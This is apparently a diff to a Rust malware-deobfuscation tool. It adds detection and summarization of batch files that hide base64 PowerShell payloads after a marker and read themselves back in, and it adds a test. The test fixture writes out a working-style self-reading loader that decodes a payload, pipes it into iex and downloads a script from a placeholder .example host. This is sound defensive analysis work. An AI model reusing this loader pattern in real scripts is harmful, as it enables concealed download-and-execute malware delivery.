@@ -5393,6 +5393,84 @@ fn render_long_rem_comment_summary(leading: &str, payload: &str, out: &mut Strin
     out.push_str(" bytes from long REM comment line ====\r\n");
 }
 
+fn self_read_base64_match_markers(input: &[u8]) -> Vec<String> {
+    let text = String::from_utf8_lossy(input);
+    let lower = text.to_ascii_lowercase();
+    if !lower.contains("-match") || !lower.contains("frombase64string") {
+        return Vec::new();
+    }
+
+    let mut out = Vec::new();
+    let mut cursor = 0usize;
+    while let Some(rel) = lower[cursor..].find("-match") {
+        let after_match = cursor + rel + "-match".len();
+        let Some(quote_rel) = text[after_match..].find(['\'', '"']) else {
+            break;
+        };
+        let quote_start = after_match + quote_rel;
+        let quote = text.as_bytes()[quote_start] as char;
+        let pattern_start = quote_start + quote.len_utf8();
+        let Some(pattern_end_rel) = text[pattern_start..].find(quote) else {
+            break;
+        };
+        let pattern = &text[pattern_start..pattern_start + pattern_end_rel];
+        if let Some(marker) = self_read_base64_marker_from_pattern(pattern) {
+            if !out.iter().any(|existing| existing == marker) {
+                out.push(marker.to_string());
+            }
+        }
+        cursor = pattern_start + pattern_end_rel + quote.len_utf8();
+    }
+    out
+}
+
+fn self_read_base64_marker_from_pattern(pattern: &str) -> Option<&str> {
+    let marker = pattern.strip_suffix("([A-Za-z0-9+/=]+)")?;
+    if (4..=200).contains(&marker.len())
+        && marker
+            .bytes()
+            .all(|b| b.is_ascii_graphic() && !matches!(b, b'(' | b')' | b'[' | b']'))
+    {
+        Some(marker)
+    } else {
+        None
+    }
+}
+
+fn summarize_self_read_base64_marker_line(
+    line: &str,
+    markers: &[String],
+    env: &mut Environment,
+    out: &mut String,
+) -> bool {
+    const MIN_MARKER_B64_BYTES: usize = 1024;
+
+    if markers.is_empty() || line.len() < MIN_MARKER_B64_BYTES {
+        return false;
+    }
+    let trimmed = line.trim_start();
+    let leading = &line[..line.len() - trimmed.len()];
+    for marker in markers {
+        let Some(b64) = trimmed.strip_prefix(marker) else {
+            continue;
+        };
+        if b64.len() < MIN_MARKER_B64_BYTES || !b64.bytes().all(is_base64_byte) {
+            continue;
+        }
+        out.push_str(leading);
+        out.push_str(&format!(
+            "::==== harrington: omitted self-read base64 marker payload (marker {} bytes, {} bytes encoded) ====\r\n",
+            marker.len(),
+            b64.len()
+        ));
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: line.len() as u64,
+        });
+        return true;
+    }
+    false
+}
+
 fn split_line_ending(line: &str) -> (&str, &str) {
     if let Some(body) = line.strip_suffix("\r\n") {
         (body, "\r\n")
@@ -5451,6 +5529,7 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
     } else {
         line_reader::read_logical_lines(input)
     };
+    let self_read_b64_markers = self_read_base64_match_markers(input);
     // Pre-scan grouped-output redirects: `( echo A\n echo B\n ) > "file"`.
     // The redirect applies to the whole block's stdout, but each echo line is
     // processed independently in the main loop, so without this the file is
@@ -5511,6 +5590,11 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
 
         env.current_line = Some(cursor);
         let logical = &lines[cursor];
+
+        if summarize_self_read_base64_marker_line(logical, &self_read_b64_markers, env, out) {
+            cursor += 1;
+            continue;
+        }
 
         if let Some((end_idx, marker)) = large_pem_block_summary_at(&lines, cursor) {
             out.push_str(logical);
@@ -12456,6 +12540,52 @@ powershell -NoP -C "try {{ $Natural = (Get-Content '%~f0') -join [Environment]::
             }),
             "embedded self-read payload URL was not extracted: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn ps1_self_read_marker_base64_carrier_line_is_summarized_without_losing_payload() {
+        use base64::Engine;
+        let marker = "remoK3Z8Q5FIG2qXL6SsHa7";
+        let payload = format!(
+            "$u='https://selfread-marker-long.example/FLEE.ps1'; Invoke-WebRequest -Uri $u;#{}",
+            "A".repeat(8_192)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+        let script = format!(
+            r#"@echo off
+powershell -NoP -C "try {{ $sweep = Get-Content '%~f0' -Raw; if ($sweep -match '{marker}([A-Za-z0-9+/=]+)') {{ [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($matches[1])) | iex }} }} catch {{}}"
+exit /b
+{marker}{b64}
+"#
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://selfread-marker-long.example/FLEE.ps1")),
+            "marker self-read payload was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. }
+                    if src.contains("selfread-marker-long.example/FLEE.ps1"))
+            }),
+            "marker self-read payload URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("harrington: omitted self-read base64 marker payload"),
+            "marker carrier line was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64),
+            "marker carrier base64 remained in deobfuscated output"
         );
     }
 
